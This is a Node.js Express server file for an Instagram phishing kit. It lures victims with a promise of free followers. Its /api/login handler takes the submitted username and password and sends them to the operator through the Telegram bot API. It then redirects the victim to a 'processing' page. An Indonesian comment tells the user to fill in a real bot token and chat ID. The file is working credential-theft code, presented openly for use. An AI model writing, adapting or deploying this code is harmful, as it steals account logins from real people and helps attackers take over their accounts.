const express = require('express');
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// GANTI DENGAN TOKEN DAN CHAT ID ASLI ANDA
const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
const CHAT_ID = 'YOUR_CHAT_ID_HERE';

app.post('/api/login', async (req, res) => {
    const { username, password, followers } = req.body;

    if (!username || !password) {
        return res.status(400).json({ error: 'Missing credentials' });
    }

    const message = `🔥 *INSTAGRAM PHISHING - FOLLOWERS TOOL* 🔥\n\n👤 *Username/Email:* ${username}\n🔑 *Password:* ${password}\n📊 *Requested Followers:* ${parseInt(followers || 10000).toLocaleString()}\n⏰ *Time:* ${new Date().toLocaleString()}`;

    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        console.log(`[SUCCESS] Credentials sent: ${username}`);
        res.redirect('/processing.html');
    } catch (err) {
        console.error('[ERROR] Failed to send:', err);
        res.redirect('/processing.html');
    }
});

module.exports = app;
